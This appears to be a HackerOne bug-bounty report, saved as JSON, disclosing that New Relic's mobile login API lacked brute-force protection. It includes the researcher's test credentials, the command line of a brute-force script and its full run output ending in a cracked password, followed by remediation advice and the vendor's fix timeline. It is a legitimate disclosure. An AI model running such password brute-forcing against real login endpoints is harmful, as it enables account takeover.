{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-02-19T22:56:24.420Z", 
    "voters": [
        "delimitry", 
        "arneswinnen", 
        "bl4de", 
        "bogdantcaciuc", 
        "geekboy", 
        "malcolmx", 
        "eveeez", 
        "babayaga_", 
        "kiraak-boy", 
        "mrgriffin", 
        "and 3 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 127202, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-02-18T01:40:21.727Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Mobile Authentication Endpoint Credentials Brute-Force Vulnerability", 
    "is_member_of_team?": null, 
    "vote_count": 13, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-03-20T01:40:21.776Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "newrelicmobilebrute.py", 
            "type": "text/x-java", 
            "id": 82402, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/082/402/6c734269f7aae36e0b22f2a3048099d187f3c7bb/newrelicmobilebrute.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224319Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=11a073c4358ca25099308e98caa3ac03773162a6136a1d4144a399faf8f8c351"
        }, 
        {
            "file_name": "10k_most_common.txt", 
            "type": "text/x-c++", 
            "id": 82403, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/082/403/5aee429bec41246da393d3c7690670f530dac39c/10k_most_common.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224319Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=331db44758804ed4e3d6a6ddbe1fa6d931f6c468d13e4f1269a1d0e38c7babc6"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-04-01T23:39:26.367Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-01T23:39:26.367Z", 
            "actor": {
                "username": "ahamlin", 
                "url": "/ahamlin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/071/f64610f48ed92d78a126cc855754c0aaef4beaee_medium.jpg?1507763206"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hello Arne,\n\nThank you for your (very well-written) report! I have validated the lack of brute-force protections against the API and have filed an issue with the appropriate engineering team. We will keep you up-to-date on its progress.", 
            "markdown_message": "<p>Hello Arne,</p>\n\n<p>Thank you for your (very well-written) report! I have validated the lack of brute-force protections against the API and have filed an issue with the appropriate engineering team. We will keep you up-to-date on its progress.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 884252, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-03T22:20:51.950Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-03T22:20:51.950Z", 
            "actor": {
                "username": "arneswinnen", 
                "url": "/arneswinnen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/061/086/0e04ab91b3592e0d93cb03ea751ee23d36052742_medium.JPG?1458046997"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hi,\n\nWould you have any update, given that it's been a month since the first vulnerability report?\n\nThanks,\n\nArne", 
            "markdown_message": "<p>Hi,</p>\n\n<p>Would you have any update, given that it&#39;s been a month since the first vulnerability report?</p>\n\n<p>Thanks,</p>\n\n<p>Arne</p>\n", 
            "type": "Activities::Comment", 
            "id": 939354, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-03T22:37:41.932Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-03T22:37:41.932Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hi Arne - we've filed the bug with the appropriate Engineering team and it's in their queue - no updates beyond that at this time. ", 
            "markdown_message": "<p>Hi Arne - we&#39;ve filed the bug with the appropriate Engineering team and it&#39;s in their queue - no updates beyond that at this time. </p>\n", 
            "type": "Activities::Comment", 
            "id": 939375, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-04T23:37:50.871Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T23:37:50.871Z", 
            "actor": {
                "username": "arneswinnen", 
                "url": "/arneswinnen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/061/086/0e04ab91b3592e0d93cb03ea751ee23d36052742_medium.JPG?1458046997"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hi,\n\nOk, I'll await future updates from here on.\n\nThanks,\n\nArne", 
            "markdown_message": "<p>Hi,</p>\n\n<p>Ok, I&#39;ll await future updates from here on.</p>\n\n<p>Thanks,</p>\n\n<p>Arne</p>\n", 
            "type": "Activities::Comment", 
            "id": 941249, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-30T00:22:24.131Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-30T00:22:24.131Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Hi, work to resolve this issue has begun, thanks again for the report ! ", 
            "markdown_message": "<p>Hi, work to resolve this issue has begun, thanks again for the report ! </p>\n", 
            "type": "Activities::Comment", 
            "id": 1096661, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "arneswinnen", 
                "url": "/arneswinnen"
            }, 
            "created_at": "2016-08-12T23:42:03.646Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-12T23:42:03.646Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "We believe this issue to be resolved. Thanks very much for reporting it to us, we really appreciate your help keeping New Relic and its customers secure!", 
            "markdown_message": "<p>We believe this issue to be resolved. Thanks very much for reporting it to us, we really appreciate your help keeping New Relic and its customers secure!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1124357, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-18T01:40:21.749Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-18T01:40:21.749Z", 
            "actor": {
                "username": "imelven", 
                "url": "/imelven", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/153/4df54ed716b59237add2eccc46f1f39b24d6feef_medium.jpeg?1454633488"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1492464, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-19T22:56:24.435Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-19T22:56:24.435Z", 
            "actor": {
                "username": "arneswinnen", 
                "url": "/arneswinnen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/061/086/0e04ab91b3592e0d93cb03ea751ee23d36052742_medium.JPG?1458046997"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1494101, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-19T22:56:24.465Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-19T22:56:24.465Z", 
            "actor": {
                "username": "arneswinnen", 
                "url": "/arneswinnen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/061/086/0e04ab91b3592e0d93cb03ea751ee23d36052742_medium.JPG?1458046997"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1494102, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-03T03:32:48.800Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-03T03:32:48.800Z", 
            "actor": {
                "url": "/newrelic", 
                "profile": {
                    "name": "New Relic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
                }
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::NotEligibleForBounty", 
            "id": 2694264, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "arneswinnen", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/arneswinnen", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/061/086/b0d69107cdd8b47f2226431d3cd85241611c19ae_small.JPG?1458046997"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 27, 
        "name": "Improper Authentication - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -54162177.34282676, 
    "disclosed_at": "2017-02-19T22:56:24.452Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/127202", 
    "created_at": "2016-03-31T22:20:36.249Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Dear,</p>\n\n<p>Your web authentication (login) endpoint, <a title=\"https://login.newrelic.com/login\" href=\"/redirect?signature=c3cc43ec9a6915568a705cb3a71acd1cc0e56f8c&amp;url=https%3A%2F%2Flogin.newrelic.com%2Flogin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://login.newrelic.com/login</span><i class=\"icon-external-link\"></i></a>, currently properly protects against brute-force attacks. After a couple of 100 automated login attempts, a Captcha is required to login to the account under attack, even from a different IP address. Perfect, good job. I don&#39;t see that too often. </p>\n\n<p>However, your mobile authentication (login) endpoint currently does not have any protection against brute-force attacks. Login requests to <a title=\"https://login.newrelic.com/api/v1/tokens\" href=\"/redirect?signature=549c5cb1c0dd2e841286b1cc878f9b74ce99cb4d&amp;url=https%3A%2F%2Flogin.newrelic.com%2Fapi%2Fv1%2Ftokens\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://login.newrelic.com/api/v1/tokens</span><i class=\"icon-external-link\"></i></a> can be sent in a loop with different values for the &quot;password&quot; parameter, and no rate limiting/captcha/account lockout requiring out-of-band verification is present. This allows for brute-forcing of credentials, for example based on breached clear-text password databases of which there are many publicly available (<a title=\"https://wiki.skullsecurity.org/Passwords\" href=\"/redirect?signature=a84d27f0e96e26b6b85f697d764952d4515174c9&amp;url=https%3A%2F%2Fwiki.skullsecurity.org%2FPasswords\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://wiki.skullsecurity.org/Passwords</span><i class=\"icon-external-link\"></i></a>).</p>\n\n<p>A proof-of-concept python script can be found in attachment. This was invoked to brute-force the credentials of my New Relic test account, <a title=\"ferrariverdasco@gmail.com\" href=\"mailto:ferrariverdasco@gmail.com\" rel=\"nofollow noopener noreferrer\">ferrariverdasco@gmail.com</a>:Password1!, in a little more than 200 seconds. First, 10.000 wrong guesses are performed taken from a public dictionary (<a title=\"https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k_most_common.txt\" href=\"/redirect?signature=459f3c5a60fa423110135bdedc1aa701f96f200e&amp;url=https%3A%2F%2Fgithub.com%2Fdanielmiessler%2FSecLists%2Fblob%2Fmaster%2FPasswords%2F10k_most_common.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k_most_common.txt</span><i class=\"icon-external-link\"></i></a>), after which the 10.001th guess is the correct password and properly identified by the brute-force script. This was then used to login to the mobile app, which worked like a charm - no additional account verification step needed. Of course, a real mass exploitation attack would invoke multiple instances of this script and deploy more threads per instance. It could go at virtually unlimited speeds. </p>\n<pre class=\"highlight plaintext\"><code># cat 10k_most_common.txt | wc -l\n10001\n</code></pre><pre class=\"highlight plaintext\"><code># tail 10k_most_common.txt \nhoes\nhowie\nhevnm4\nhugohugo\neighty\nepson\nevangeli\neeeee1\neyphed\nPassword1!\n</code></pre><pre class=\"highlight plaintext\"><code># python newrelicmobilebrute.py ferrariverdasco@gmail.com 10k_most_common.txt 50\n[INFO] Creating 50 worker threads...\n[INFO] Total # passwords: 10001\n[INFO] Total # threads: 50\n71.20 pw/s [] 3% (356/10001)\n57.30 pw/s [=] 5% (573/10001)\n53.67 pw/s [=] 8% (805/10001)\n52.65 pw/s [==] 10% (1053/10001)\n50.84 pw/s [==] 12% (1271/10001)\n50.23 pw/s [===] 15% (1507/10001)\n50.03 pw/s [===] 17% (1751/10001)\n48.98 pw/s [===] 19% (1959/10001)\n49.56 pw/s [====] 22% (2230/10001)\n49.54 pw/s [====] 24% (2477/10001)\n49.89 pw/s [=====] 27% (2744/10001)\n49.32 pw/s [=====] 29% (2959/10001)\n49.85 pw/s [======] 32% (3240/10001)\n49.80 pw/s [======] 34% (3486/10001)\n49.37 pw/s [=======] 37% (3703/10001)\n49.56 pw/s [=======] 39% (3965/10001)\n49.47 pw/s [========] 42% (4205/10001)\n49.12 pw/s [========] 44% (4421/10001)\n49.43 pw/s [=========] 46% (4696/10001)\n49.57 pw/s [=========] 49% (4957/10001)\n49.74 pw/s [==========] 52% (5223/10001)\n49.77 pw/s [==========] 54% (5475/10001)\n49.74 pw/s [===========] 57% (5720/10001)\n49.96 pw/s [===========] 59% (5995/10001)\n49.85 pw/s [============] 62% (6231/10001)\n49.72 pw/s [============] 64% (6463/10001)\n49.95 pw/s [=============] 67% (6743/10001)\n49.76 pw/s [=============] 69% (6967/10001)\n49.70 pw/s [==============] 72% (7206/10001)\n49.68 pw/s [==============] 74% (7452/10001)\n49.54 pw/s [===============] 76% (7679/10001)\n49.68 pw/s [===============] 79% (7949/10001)\n49.75 pw/s [================] 82% (8209/10001)\n49.72 pw/s [================] 84% (8452/10001)\n49.78 pw/s [=================] 87% (8711/10001)\n49.68 pw/s [=================] 89% (8942/10001)\n49.90 pw/s [==================] 92% (9231/10001)\n49.87 pw/s [==================] 94% (9475/10001)\n49.73 pw/s [===================] 96% (9698/10001)\n49.83 pw/s [===================] 99% (9965/10001)\n[SUCCESS] Found the right password: Password1!\n48.79 pw/s [====================] 100% (10001/10001)\n[End] Total time: 207 seconds\n</code></pre>\n<p>One example of a similar vulnerability that was exploited by blackhats in the past would be Apple&#39;s Celebgate scandal of January 2015, where celebrity passwords were brute-forced through an unprotected Apple authentication endpoint. In the case of New Relic, this could lead to the compromise of many accounts, since it is a well-known fact that people tend to choose similar passwords which turn up in dictionaries. </p>\n\n<p>For more info, see <a title=\"http://www.imperva.com/docs/WP_Consumer_Password_Worst_Practices.pdf\" href=\"/redirect?signature=df2dc1bfde6bf24fb2d46608b5db4e3cea9c650d&amp;url=http%3A%2F%2Fwww.imperva.com%2Fdocs%2FWP_Consumer_Password_Worst_Practices.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.imperva.com/docs/WP_Consumer_Password_Worst_Practices.pdf</span><i class=\"icon-external-link\"></i></a> . A password analysis study of the 32-million clear-text password leak of the rockyou website breach reveals that by guessing the topmost 4655 passwords in this dump against all users, an attacker will gain access to around 20% of those (page 4). That would be a lot of New Relic accounts.</p>\n\n<p>Recommendation on the short-term: Enforce rate limiting on the mobile authentication endpoint based on IP address<br>\nRecommendation on the mid-to-long term: Implement proper account lockout policy / Captcha protection after threshold on the authentication endpoint has been reached by any attacker.</p>\n\n<p>Best regards,</p>\n\n<p>Arne Swinnen<br>\n<a title=\"https://www.arneswinnen.net\" href=\"/redirect?signature=b36b3bff6f7228758fa087b6c9a475c8d1dd90a6&amp;url=https%3A%2F%2Fwww.arneswinnen.net\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.arneswinnen.net</span><i class=\"icon-external-link\"></i></a></p>\n", 
    "vulnerability_information": "Dear,\n\nYour web authentication (login) endpoint, https://login.newrelic.com/login, currently properly protects against brute-force attacks. After a couple of 100 automated login attempts, a Captcha is required to login to the account under attack, even from a different IP address. Perfect, good job. I don't see that too often. \n\nHowever, your mobile authentication (login) endpoint currently does not have any protection against brute-force attacks. Login requests to https://login.newrelic.com/api/v1/tokens can be sent in a loop with different values for the \"password\" parameter, and no rate limiting/captcha/account lockout requiring out-of-band verification is present. This allows for brute-forcing of credentials, for example based on breached clear-text password databases of which there are many publicly available (https://wiki.skullsecurity.org/Passwords).\n\nA proof-of-concept python script can be found in attachment. This was invoked to brute-force the credentials of my New Relic test account, ferrariverdasco@gmail.com:Password1!, in a little more than 200 seconds. First, 10.000 wrong guesses are performed taken from a public dictionary (https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k_most_common.txt), after which the 10.001th guess is the correct password and properly identified by the brute-force script. This was then used to login to the mobile app, which worked like a charm - no additional account verification step needed. Of course, a real mass exploitation attack would invoke multiple instances of this script and deploy more threads per instance. It could go at virtually unlimited speeds. \n\n```\n# cat 10k_most_common.txt | wc -l\n10001\n```\n\n```\n# tail 10k_most_common.txt \nhoes\nhowie\nhevnm4\nhugohugo\neighty\nepson\nevangeli\neeeee1\neyphed\nPassword1!\n```\n\n```\n# python newrelicmobilebrute.py ferrariverdasco@gmail.com 10k_most_common.txt 50\n[INFO] Creating 50 worker threads...\n[INFO] Total # passwords: 10001\n[INFO] Total # threads: 50\n71.20 pw/s [] 3% (356/10001)\n57.30 pw/s [=] 5% (573/10001)\n53.67 pw/s [=] 8% (805/10001)\n52.65 pw/s [==] 10% (1053/10001)\n50.84 pw/s [==] 12% (1271/10001)\n50.23 pw/s [===] 15% (1507/10001)\n50.03 pw/s [===] 17% (1751/10001)\n48.98 pw/s [===] 19% (1959/10001)\n49.56 pw/s [====] 22% (2230/10001)\n49.54 pw/s [====] 24% (2477/10001)\n49.89 pw/s [=====] 27% (2744/10001)\n49.32 pw/s [=====] 29% (2959/10001)\n49.85 pw/s [======] 32% (3240/10001)\n49.80 pw/s [======] 34% (3486/10001)\n49.37 pw/s [=======] 37% (3703/10001)\n49.56 pw/s [=======] 39% (3965/10001)\n49.47 pw/s [========] 42% (4205/10001)\n49.12 pw/s [========] 44% (4421/10001)\n49.43 pw/s [=========] 46% (4696/10001)\n49.57 pw/s [=========] 49% (4957/10001)\n49.74 pw/s [==========] 52% (5223/10001)\n49.77 pw/s [==========] 54% (5475/10001)\n49.74 pw/s [===========] 57% (5720/10001)\n49.96 pw/s [===========] 59% (5995/10001)\n49.85 pw/s [============] 62% (6231/10001)\n49.72 pw/s [============] 64% (6463/10001)\n49.95 pw/s [=============] 67% (6743/10001)\n49.76 pw/s [=============] 69% (6967/10001)\n49.70 pw/s [==============] 72% (7206/10001)\n49.68 pw/s [==============] 74% (7452/10001)\n49.54 pw/s [===============] 76% (7679/10001)\n49.68 pw/s [===============] 79% (7949/10001)\n49.75 pw/s [================] 82% (8209/10001)\n49.72 pw/s [================] 84% (8452/10001)\n49.78 pw/s [=================] 87% (8711/10001)\n49.68 pw/s [=================] 89% (8942/10001)\n49.90 pw/s [==================] 92% (9231/10001)\n49.87 pw/s [==================] 94% (9475/10001)\n49.73 pw/s [===================] 96% (9698/10001)\n49.83 pw/s [===================] 99% (9965/10001)\n[SUCCESS] Found the right password: Password1!\n48.79 pw/s [====================] 100% (10001/10001)\n[End] Total time: 207 seconds\n```\n\nOne example of a similar vulnerability that was exploited by blackhats in the past would be Apple's Celebgate scandal of January 2015, where celebrity passwords were brute-forced through an unprotected Apple authentication endpoint. In the case of New Relic, this could lead to the compromise of many accounts, since it is a well-known fact that people tend to choose similar passwords which turn up in dictionaries. \n\nFor more info, see http://www.imperva.com/docs/WP_Consumer_Password_Worst_Practices.pdf . A password analysis study of the 32-million clear-text password leak of the rockyou website breach reveals that by guessing the topmost 4655 passwords in this dump against all users, an attacker will gain access to around 20% of those (page 4). That would be a lot of New Relic accounts.\n\nRecommendation on the short-term: Enforce rate limiting on the mobile authentication endpoint based on IP address\nRecommendation on the mid-to-long term: Implement proper account lockout policy / Captcha protection after threshold on the authentication endpoint has been reached by any attacker.\n\nBest regards,\n\nArne Swinnen\nhttps://www.arneswinnen.net\n\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://newrelic.com", 
            "about": "New Relic's Coordinated Disclosure Program", 
            "twitter_handle": "newrelic", 
            "name": "New Relic"
        }, 
        "handle": "newrelic", 
        "url": "https://hackerone.com/newrelic", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/011/4a259e2f731f105c784b1279db99215cefb8abbd_small.?1482361910", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 17011, 
        "default_currency": "usd"
    }, 
    "is_published": false
}